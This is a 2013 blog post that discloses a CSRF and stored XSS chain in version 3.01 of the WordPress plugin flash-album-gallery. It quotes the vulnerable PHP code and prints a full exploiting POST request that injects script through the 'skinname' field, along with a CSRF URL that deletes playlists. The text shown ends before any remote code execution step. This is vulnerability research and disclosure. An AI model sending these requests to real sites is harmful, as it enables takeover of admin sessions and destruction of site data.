<!DOCTYPE html>
<html lang="en">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" type="text/css" href="/theme/css/style.min.css">
  <link rel="stylesheet" type="text/css" href="/theme/css/pygments.min.css">
  <link rel="stylesheet" type="text/css" href="/theme/css/font-awesome.min.css">

  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="index, follow" />
<meta name="author" content="Nikolai Tschacher" />
<meta name="description" content="PLUGIN: http://wordpress.org/plugins/flash-album-gallery/ AFFECTED VERSION: 3.01 DOWNLOADS: 840,714 RISK: MEDIUM/HIGH The following blog post addresses a critical (chain) of security issues in the version 3.01 of flash-album-gallery which eventually leads to remote code execution. The exploit is not completely automatically and needs a ..." />
<meta name="keywords" content="Exploit, Programming, Bug, Security, Xss, Rce">
<meta property="og:site_name" content="Coding, Learning and IT Security"/>
<meta property="og:title" content="No 2. - flash-album-gallery: persistent XSS exploitet with help of XSRF leading to remote code execution."/>
<meta property="og:description" content="PLUGIN: http://wordpress.org/plugins/flash-album-gallery/ AFFECTED VERSION: 3.01 DOWNLOADS: 840,714 RISK: MEDIUM/HIGH The following blog post addresses a critical (chain) of security issues in the version 3.01 of flash-album-gallery which eventually leads to remote code execution. The exploit is not completely automatically and needs a ..."/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="/no-2-flash-album-gallery-persistent-xss-exploitet-with-help-of-xsrf-leading-to-remote-code-execution-k.html"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2013-07-27 15:44:00+02:00"/>
<meta property="article:modified_time" content=""/>
<meta property="article:author" content="/author/nikolai-tschacher.html">
<meta property="article:section" content="Programming"/>
<meta property="article:tag" content="Exploit"/>
<meta property="article:tag" content="Programming"/>
<meta property="article:tag" content="Bug"/>
<meta property="article:tag" content="Security"/>
<meta property="article:tag" content="Xss"/>
<meta property="article:tag" content="Rce"/>
<meta property="og:image" content="">  <title>Coding, Learning and IT Security &ndash; No 2. - flash-album-gallery: persistent XSS exploitet with help of XSRF leading to remote code execution.</title>
</head>
<body>
  <aside>
    <div>
      <a href="">
        <img src="/theme/img/profile.png" alt="Coding, Learning and IT Security" title="Coding, Learning and IT Security">
      </a>
      <h1><a href="">Coding, Learning and IT Security</a></h1>
      <p></p>
      <nav>
        <ul class="list">
          <li><a href="/pages/about.html#about">About</a></li>
          <li><a href="/pages/contact.html#contact">Contact</a></li>
          <li><a href="/pages/googlescraper-py.html#googlescraper-py">GoogleScraper.py</a></li>
          <li><a href="/pages/projects.html#projects">Projects</a></li>
          <li><a href="/pages/impressum.html#impressum">Site Notice</a></li>
          <li><a href="/pages/svgcaptcha.html#svgcaptcha">SVGCaptcha</a></li>
        </ul>
      </nav>
      <ul class="social">
        <li><a class="sc-twitter" href="https://twitter.com/incolumitas_" target="_blank"><i class="fa fa-twitter"></i></a></li>
        <li><a class="sc-github" href="https://github.com/NikolaiT" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-rss" href="//incolumitas/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
        <li><a class="sc-stack-overflow" href="http://stackoverflow.com/users/1052496/nikolai-tschacher" target="_blank"><i class="fa fa-stack-overflow"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="">Home</a>
      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>
    </nav>

<article>
  <header>
    <h1 id="no-2-flash-album-gallery-persistent-xss-exploitet-with-help-of-xsrf-leading-to-remote-code-execution-k">No 2. - flash-album-gallery: persistent XSS exploitet with help of XSRF leading to remote code execution.</h1>
    <p>Posted on Sa 27 Juli 2013 in <a href="/category/programming.html">Programming</a></p>
  </header>
  <div>
    <p><strong>PLUGIN:</strong> http://wordpress.org/plugins/flash-album-gallery/<br />
<strong>AFFECTED VERSION:</strong> 3.01<br />
<strong>DOWNLOADS:</strong> 840,714<br />
<strong>RISK:</strong> MEDIUM/HIGH</p>
<p>The following blog post addresses a critical (chain) of security issues
in the version 3.01 of flash-album-gallery<br />
which eventually leads to remote code execution. The exploit is not
completely automatically and needs a minimal amount<br />
of social engineering. Nevertheless I rate the danger at a medium/high
level {Probably even worse than a fully automatable SQL injection).</p>
<p>First of all, I need to say that the plugin code lacks a fair amount of
secure programming techniques and has inherent design flaws as far<br />
as I can say this [I am not a software engineer, I do security as a
hobby]. Assumingly, this is a direct result of heterogenous and<br />
evolutionary growth of the software.<br />
I researched flash-album-gallery mainly in June 2013 and after some
weeks I found a CSRF vulnerability in combination with<br />
a stored XSS. But on the same time I was preparing to contact the
author and reveal my findings, I noticed a new version and<br />
the bug seemed to be found by an independent researcher. See below the
lines <em>Fix: vulnerability with albums</em> and  <em>Fix: XSS bugs reported by Ken S for the White Fir Design Bug
Bounty</em>.</p>
<div class="highlight"><pre>= v3.00 - 26.06.2013 =
* Fix: Free skins settings reset to default after plugin update
* Fix: XSS bugs reported by Ken S for the White Fir Design Bug Bounty
* Fix: small bugfixes
* New: iOS application &#39;MyPGC&#39; for Flagallery plugin now available on the App Store

= v2.78 - 26.06.2013 =
* Fix: bundled free skins not copied to flagallery-skins directory

= v2.77 - 25.06.2013 =
* Fix: vulnerability with albums
* Fix: PHP Notices
* Fix: Compatibility with some modern themes
* Update: New version of swfupload
* Update: Compatibility with Wordpress SEO plugin
* Update: Update code for default skins
</pre></div>


<p>I considered the issue as solved [To my shame] and called the
researching an end and forgot about flash-album-gallery.<br />
But currently, I was revisiting the code and saw that there is still
exactly the same issue with another variable and file.</p>
<p>The concerned file is music-box.php situated at
/wp-content/plugins/flash-album-gallery/admin/music-box.php at LINE
17. This is the vulnerable function:</p>
<div class="highlight"><pre><span class="x">function flag_music_controler() {</span>
<span class="x">    if (isset($_POST[&#39;importfolder&#39;]) &amp;&amp; $_POST[&#39;importfolder&#39;]){</span>
<span class="x">        check_admin_referer(&#39;flag_addmp3&#39;);</span>
<span class="x">        $mp3folder = $_POST[&#39;mp3folder&#39;];</span>
<span class="x">        if ( !empty($mp3folder) )</span>
<span class="x">            flagAdmin::import_mp3($mp3folder);</span>
<span class="x">    }</span>
<span class="x">    $mode = isset($_REQUEST[&#39;mode&#39;])? $_REQUEST[&#39;mode&#39;] : &#39;main&#39;;</span>
<span class="x">    $action = isset($_REQUEST[&#39;bulkaction&#39;])? $_REQUEST[&#39;bulkaction&#39;] : false;</span>
<span class="x">    if($action == &#39;no_action&#39;) {</span>
<span class="x">        $action = false;</span>
<span class="x">    }</span>
<span class="x">    switch($mode) {</span>
<span class="x">        case &#39;sort&#39;:</span>
<span class="x">            include_once (dirname (__FILE__) . &#39;/playlist-sort.php&#39;);</span>
<span class="x">            flag_playlist_order();</span>
<span class="x">        break;</span>
<span class="x">        case &#39;edit&#39;:</span>
<span class="x">            $file = urlencode($_GET[&#39;playlist&#39;]);</span>
<span class="x">            if(isset($_POST[&#39;updatePlaylist&#39;])) {</span>
<span class="x">                $title = esc_html($_POST[&#39;playlist_title&#39;]);</span>
<span class="x">                $descr = esc_html($_POST[&#39;playlist_descr&#39;]);</span>
<span class="x">                $data = array();</span>
<span class="x">                foreach($_POST[&#39;item_a&#39;] as $item_id =&gt; $item) {</span>
<span class="x">                    if($action==&#39;delete_items&#39; &amp;&amp; in_array($item_id, $_POST[&#39;doaction&#39;]))</span>
<span class="x">                        continue;</span>
<span class="x">                    $data[] = $item_id;</span>
<span class="x">                }</span>
<span class="x">                flagGallery::flagSaveWpMedia();</span>
<span class="x">                flagSavePlaylist($title,$descr,$data,$file);</span>
<span class="x">            }</span>
<span class="x">            if(isset($_POST[&#39;updatePlaylistSkin&#39;])) {</span>
<span class="x">                flagSavePlaylistSkin($file);</span>
<span class="x">            }</span>
<span class="x">            include_once (dirname (__FILE__) . &#39;/manage-playlist.php&#39;);</span>
<span class="x">            flag_playlist_edit();</span>
<span class="x">        break;</span>
<span class="x">        case &#39;save&#39;:</span>
<span class="x">            if(isset($_POST[&#39;items_array&#39;])){</span>
<span class="x">                $title = esc_html($_POST[&#39;playlist_title&#39;]);</span>
<span class="x">                $descr = esc_html($_POST[&#39;playlist_descr&#39;]);</span>
<span class="x">                $data = $_POST[&#39;items_array&#39;];</span>
<span class="x">                $file = isset($_REQUEST[&#39;playlist&#39;])? urlencode($_REQUEST[&#39;playlist&#39;]) : false;</span>
<span class="x">                flagGallery::flagSaveWpMedia();</span>
<span class="x">                flagSavePlaylist($title,$descr,$data, $file);</span>
<span class="x">            }</span>
<span class="x">            if(isset($_GET[&#39;playlist&#39;])) {</span>
<span class="x">                include_once (dirname (__FILE__) . &#39;/manage-playlist.php&#39;);</span>
<span class="x">                flag_playlist_edit();</span>
<span class="x">            } else {</span>
<span class="x">                flag_created_playlists();</span>
<span class="x">                flag_music_wp_media_lib();</span>
<span class="x">            }</span>
<span class="x">        break;</span>
<span class="x">        case &#39;add&#39;:</span>
<span class="x">            if(isset($_POST[&#39;items&#39;]) &amp;&amp; isset($_GET[&#39;playlist&#39;])){</span>
<span class="x">                $added = $_POST[&#39;items&#39;];</span>
<span class="x">            } elseif(isset($_GET[&#39;playlist&#39;])) {</span>
<span class="x">                $added = $_COOKIE[&#39;musicboxplaylist_&#39;.urlencode($_GET[&#39;playlist&#39;])];</span>
<span class="x">            } else {</span>
<span class="x">                $added = false;</span>
<span class="x">            }</span>
<span class="x">            flag_music_wp_media_lib($added);</span>
<span class="x">        break;</span>
<span class="x">        case &#39;delete&#39;:</span>
<span class="x">            flag_playlist_delete(urlencode($_GET[&#39;playlist&#39;]));</span>
<span class="x">        case &#39;main&#39;:</span>
<span class="x">            if(isset($_POST[&#39;updateMedia&#39;])) {</span>
<span class="x">                flagGallery::flagSaveWpMedia();</span>
<span class="x">                flagGallery::show_message( __(&#39;Media updated&#39;,&#39;flag&#39;) );</span>
<span class="x">            }</span>
<span class="x">        default:</span>
<span class="x">            flag_created_playlists();</span>
<span class="x">            flag_music_wp_media_lib();</span>
<span class="x">        break;</span>
<span class="x">    }</span>

<span class="x">    }</span>
</pre></div>


<p>Well, alone in this function and its subsequent calls, there are more
security bugs than I can descibe here.<br />
But to just name the one critical I mentioned before, this POST request
inserts tainted data into a file, which<br />
is lateron echoed back to the admin menu which triggers an XSS.</p>
<div class="highlight"><pre>============================================ EXPLOITING POST REQUEST ========================
    Host: localhost
    User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Cookie: {The wordpress cookie of the admin}
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 117

    items_array[0]=notimportant<span class="err">&amp;</span>playlist_title=some_title<span class="err">&amp;</span>playlist_descr=some_description<span class="err">&amp;</span>mode=save<span class="err">&amp;</span>skinname=&quot;<span class="nt">&lt;script&gt;</span>alert(/Script Code/)<span class="nt">&lt;/script&gt;</span>
=============================================================================================
</pre></div>


<p>Explanation:</p>
<p>Due to inpropper coding style, this request is not protected by a nonce,
which would prevent a CSRF attack. For explanation of nonces and why<br />
they are impportant, look here:
http://www.prelovac.com/vladimir/improving-security-in-wordpress-plugins-using-nonces.<br />
However, the author<br />
probably intended to protect it with a nonce, because he actually
inserted one in the form field here:</p>
<div class="highlight"><pre><span class="c">&lt;!--</span> <span class="err">#</span><span class="nx">new_playlist</span> <span class="o">--&gt;</span>
<span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;new_playlist&quot;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;display: none;&quot;</span> <span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;form_new_playlist&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$filepath</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">&quot;</span> <span class="nx">accept</span><span class="o">-</span><span class="nx">charset</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span><span class="o">&gt;</span>
<span class="o">===&gt;</span> <span class="cp">&lt;?php</span> <span class="nx">wp_nonce_field</span><span class="p">(</span><span class="s1">&#39;flag_thickbox_form&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
     <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;new_playlist_mp3id&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;items_array&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="o">/&gt;</span>
     <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;new_playlist_bulkaction&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;TB_bulkaction&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="o">/&gt;</span>
     <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;mode&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;save&quot;</span> <span class="o">/&gt;</span>
     <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;page&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;music-box&quot;</span> <span class="o">/&gt;</span>
     <span class="o">&lt;</span><span class="nx">table</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;100%&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="s2">&quot;3&quot;</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="s2">&quot;3&quot;</span> <span class="o">&gt;</span>
</pre></div>


<p>Unfortunately, this nonce is actually never checked with a appropriate
function like<br />
- <code>wp_verify_nonce($nonce, $action = -1)</code><br />
- <code>check_ajax_referer( $action = -1, $query_arg = false, $die = true )</code> 
- <code>check_admin_referer($action = -1, $query_arg = '_wpnonce')</code></p>
<p>Henceforth, alone this constitutes a XSRF, which for itself is a
security threat. Because of the missing nonce check in all cases of the
switch statement<br />
in the above code excerpt, this requests for example deletes any album
specified by the GET parameter playlist <code>http://localhost/wordpress/wp-admin/admin.php?page=flag-music-box&amp;mode=delete&amp;playlist={Which?}</code></p>
<p>But back to main issue. Remember that we can trick any wordpress admin
with a poisoned page and a installation with this plugin to execute<br />
the above cases in the switch statement. Now consider the case save.
There is a call to a function named flagSavePlaylist().<br />
This function saves a music playlist to a xml file. Every parameter
that is written to the xml file is propperly escaped with<br />
functions like htmlspechialchars(). But one parameter is (strangely)
ignored. The variable $skin is populated with user<br />
submitable input and later written to the xml file. (See below the two
arrows). Please note, that an exploitation attempt will lead to an error
message printed (See "!Error! ===&gt;" below) because <code>file_get_contents()</code> is
called with a string constructed with the tainted $skin variable.
Script code<br />
rarily looks like valid paths. But this doesn't hinder the working of
the flow of the exploitation process.</p>
<p>file /wp-content/plugins/flash-album-gallery/admin/music-box.php at
LINE 17:</p>
<div class="highlight"><pre> <span class="kd">function</span> <span class="nx">flagSavePlaylist</span><span class="p">(</span><span class="nx">$title</span><span class="p">,</span><span class="nx">$descr</span><span class="p">,</span><span class="nx">$data</span><span class="p">,</span><span class="nx">$file</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nx">$skinaction</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">global</span> <span class="nx">$wpdb</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">trim</span><span class="p">(</span><span class="nx">$title</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nx">$title</span> <span class="o">=</span> <span class="s1">&#39;default&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nx">$title</span> <span class="o">=</span> <span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nx">$title</span><span class="p">),</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
            <span class="nx">$descr</span> <span class="o">=</span> <span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nx">$descr</span><span class="p">),</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">$file</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">$file</span> <span class="o">=</span> <span class="nx">sanitize_title</span><span class="p">(</span><span class="nx">$title</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nx">$data</span><span class="p">))</span>
                    <span class="nx">$data</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nx">$data</span><span class="p">);</span>

            <span class="nx">$flag_options</span> <span class="o">=</span> <span class="nx">get_option</span><span class="p">(</span><span class="s1">&#39;flag_options&#39;</span><span class="p">);</span>
<span class="o">===&gt;</span>        <span class="nx">$skin</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nx">$_POST</span><span class="cp">[</span><span class="s1">&#39;skinname&#39;</span><span class="cp">]</span><span class="p">)</span><span class="o">?</span> <span class="nx">$_POST</span><span class="cp">[</span><span class="s1">&#39;skinname&#39;</span><span class="cp">]</span> <span class="o">:</span> <span class="s1">&#39;music_default&#39;</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">$skinaction</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">$skinaction</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nx">$_POST</span><span class="cp">[</span><span class="s1">&#39;skinaction&#39;</span><span class="cp">]</span><span class="p">)</span><span class="o">?</span> <span class="nx">$_POST</span><span class="cp">[</span><span class="s1">&#39;skinaction&#39;</span><span class="cp">]</span> <span class="o">:</span> <span class="s1">&#39;update&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nx">$skinpath</span> <span class="o">=</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nx">$flag_options</span><span class="cp">[</span><span class="s1">&#39;skinsDirABS&#39;</span><span class="cp">]</span> <span class="p">).</span><span class="nx">$skin</span><span class="p">;</span>
            <span class="nx">$playlistPath</span> <span class="o">=</span> <span class="nx">ABSPATH</span><span class="p">.</span><span class="nx">$flag_options</span><span class="cp">[</span><span class="s1">&#39;galleryPath&#39;</span><span class="cp">]</span><span class="p">.</span><span class="s1">&#39;playlists/&#39;</span><span class="p">.</span><span class="nx">$file</span><span class="p">.</span><span class="s1">&#39;.xml&#39;</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span> <span class="nx">file_exists</span><span class="p">(</span><span class="nx">$playlistPath</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">$skin</span> <span class="o">==</span> <span class="nx">$skinaction</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="nx">$settings</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">$playlistPath</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="o">!</span><span class="nb">Error</span><span class="o">!</span> <span class="o">===&gt;</span>    <span class="nx">$settings</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">$skinpath</span> <span class="p">.</span> <span class="s2">&quot;/settings/settings.xml&quot;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nx">$properties</span> <span class="o">=</span> <span class="nx">flagGallery</span><span class="o">::</span><span class="nx">flagGetBetween</span><span class="p">(</span><span class="nx">$settings</span><span class="p">,</span><span class="s1">&#39;&lt;properties&gt;&#39;</span><span class="p">,</span><span class="s1">&#39;&lt;/properties&gt;&#39;</span><span class="p">);</span>

            <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nx">$data</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nx">$content</span> <span class="o">=</span> <span class="s1">&#39;&lt;gallery&gt;</span>
<span class="s1">    &lt;properties&gt;&#39;</span><span class="p">.</span><span class="nx">$properties</span><span class="p">.</span><span class="s1">&#39;&lt;/properties&gt;</span>
<span class="s1">    &lt;category id=&quot;&#39;</span><span class="p">.</span><span class="nx">$file</span><span class="p">.</span><span class="err">&#39;&quot;</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nx">properties</span><span class="o">&gt;</span>
                    <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$title.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
                    <span class="o">&lt;</span><span class="nx">description</span><span class="o">&gt;&lt;!</span><span class="err">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$descr.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">description</span><span class="o">&gt;</span>
<span class="o">===&gt;</span>        <span class="o">&lt;</span><span class="nx">skin</span><span class="o">&gt;&lt;!</span><span class="err">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$skin.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">skin</span><span class="o">&gt;</span>
            <span class="o">&lt;/</span><span class="nx">properties</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nx">items</span><span class="o">&gt;</span><span class="s1">&#39;;</span>

<span class="s1">                    foreach( (array) $data as $id) {</span>
<span class="s1">                            $mp3 = get_post($id);</span>
<span class="s1">                            if($mp3-&gt;post_mime_type == &#39;</span><span class="nx">audio</span><span class="p">/</span><span class="nx">mpeg</span><span class="s1">&#39;) {</span>
<span class="s1">                                $thumb = get_post_meta($id, &#39;</span><span class="nx">thumbnail</span><span class="s1">&#39;, true);</span>
<span class="s1">                                    $content .= &#39;</span>
                    <span class="o">&lt;</span><span class="nx">item</span> <span class="n">id</span><span class="o">=</span><span class="s2">&quot;&#39;.$mp3-&gt;ID.&#39;&quot;</span><span class="o">&gt;</span>
              <span class="o">&lt;</span><span class="nx">track</span><span class="o">&gt;</span><span class="s1">&#39;.wp_get_attachment_url($mp3-&gt;ID).&#39;</span><span class="o">&lt;/</span><span class="nx">track</span><span class="o">&gt;</span>
              <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;&lt;!</span><span class="err">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$mp3-&gt;post_title.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
              <span class="o">&lt;</span><span class="nx">description</span><span class="o">&gt;&lt;!</span><span class="err">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="s1">&#39;.$mp3-&gt;post_content.&#39;</span><span class="cp">]</span><span class="p">]]]</span><span class="o">&gt;&lt;!</span><span class="cp">[</span><span class="nx">CDATA</span><span class="err">[</span><span class="o">&gt;&lt;/</span><span class="nx">description</span><span class="o">&gt;</span>
              <span class="o">&lt;</span><span class="nx">thumbnail</span><span class="o">&gt;</span><span class="s1">&#39;.$thumb.&#39;</span><span class="o">&lt;/</span><span class="nx">thumbnail</span><span class="o">&gt;</span>
            <span class="o">&lt;/</span><span class="nx">item</span><span class="o">&gt;</span><span class="s1">&#39;;</span>
<span class="s1">                            }</span>
<span class="s1">                    }</span>
<span class="s1">                    $content .= &#39;</span>
            <span class="o">&lt;/</span><span class="nx">items</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="nx">category</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="nx">gallery</span><span class="o">&gt;</span><span class="s1">&#39;;</span>
<span class="s1">                    // Save options</span>
<span class="s1">                    $flag_options = get_option(&#39;</span><span class="nx">flag_options</span><span class="s1">&#39;);</span>
<span class="s1">                    if(wp_mkdir_p(ABSPATH.$flag_options[&#39;</span><span class="nx">galleryPath</span><span class="s1">&#39;].&#39;</span><span class="nx">playlists</span><span class="o">/</span><span class="s1">&#39;)) {</span>
<span class="s1">                            if( flagGallery::saveFile($playlistPath,$content,&#39;</span><span class="nx">w</span><span class="s1">&#39;) ){</span>
<span class="s1">                                    flagGallery::show_message(__(&#39;</span><span class="nx">Playlist</span> <span class="nx">Saved</span> <span class="nx">Successfully</span><span class="s1">&#39;,&#39;</span><span class="nx">flag</span><span class="s1">&#39;));</span>
<span class="s1">                            }</span>
<span class="s1">                    } else {</span>
<span class="s1">                            flagGallery::show_message(__(&#39;</span><span class="nx">Create</span> <span class="nx">directory</span> <span class="nx">please</span><span class="p">:</span><span class="s1">&#39;,&#39;</span><span class="nx">flag</span><span class="s1">&#39;).&#39;</span><span class="s2">&quot;/&#39;.$flag_options[&#39;galleryPath&#39;].&#39;playlists/&quot;</span><span class="s1">&#39;);</span>
<span class="s1">                    }</span>
<span class="s1">            }</span>
<span class="s1">    }</span>
</pre></div>


<p>Now we know that tainted [html/javascript] data is in a xml file. This
is not dangerous by itself [But really bad at least].<br />
But what if this data is written back to the browser without
sanitation? Then we could write any script code within a admin<br />
session.</p>
<p>But this is exactly what happens here in the file /wp-content/plugins/flash-album-gallery/admin/music-box.php at LINE 386:</p>
<div class="highlight"><pre><span class="x"> </span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="nv">$added</span><span class="o">===</span><span class="k">false</span><span class="p">)</span> <span class="p">{</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">                                    &lt;input name=&quot;updateMedia&quot; class=&quot;button-primary&quot; style=&quot;float: right;&quot; type=&quot;submit&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s1">&#39;Update Media&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
<span class="x">                                    </span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;json_encode&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">                                    &lt;select name=&quot;bulkaction&quot; id=&quot;bulkaction&quot;&gt;</span>
<span class="x">                                            &lt;option value=&quot;no_action&quot; &gt;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s2">&quot;No action&quot;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/option&gt;</span>
<span class="x">                                            &lt;option value=&quot;new_playlist&quot; &gt;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s2">&quot;Create new playlist&quot;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/option&gt;</span>
<span class="x">                                    &lt;/select&gt;</span>
<span class="x">                                    &lt;input name=&quot;showThickbox&quot; class=&quot;button-secondary&quot; type=&quot;submit&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s1">&#39;Apply&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; onclick=&quot;if ( !checkSelected() ) return false;&quot; /&gt;</span>
<span class="x">                                    </span><span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">                    &lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">admin_url</span><span class="p">(</span> <span class="s1">&#39;media-new.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; class=&quot;button&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s1">&#39;Upload Music&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/a&gt;</span>
<span class="x">                                    &lt;input type=&quot;hidden&quot; id=&quot;items_array&quot; name=&quot;items_array&quot; value=&quot;&quot; /&gt;</span>
